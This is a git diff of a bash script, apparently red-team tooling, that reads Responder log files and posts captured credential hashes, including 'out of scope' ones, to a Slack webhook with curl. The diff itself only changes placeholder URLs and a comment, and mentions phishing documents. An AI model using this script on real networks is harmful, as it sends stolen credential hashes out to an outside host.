@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ## DEFAULTS IF NOT FROM PHISHING DOCS
-SlackURL="https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_HERE"
+SlackURL="https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_URL_HERE"
 SlackChannel="#YOUR_SLACK_CHANNEL_HERE"
-APIURL="https://YOUR_SLACK_DOMAIN_HERE"
+APIURL="https://YOUR_API_URL_HERE"
 
 files=$(cd /home/ubuntu/Responder/logs && ls *.txt | awk '{print $1}');
 
@@ -43,7 +43,7 @@ fi
 
   if [ -z "$Title" ]
   then
-  ## COMMENT THE NEXT TWO LINES OUT IF YOU DO NOT WISH TO BE NOTIFIED FOR OUT OF SCOPE HASHES
+## COMMENT THE NEXT TWO LINES OUT IF YOU DO NOT WISH TO BE NOTIFIED FOR OUT OF SCOPE HASHES
       message=$(echo "> Captured an out of scope" $HashType "hash ("$Module") at" $IP"\r\n> \`\`\`"$Hashes"\`\`\`");
       curl -s -X POST --data-urlencode 'payload={"channel": "'$SlackChannel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $SlackURL
   fi
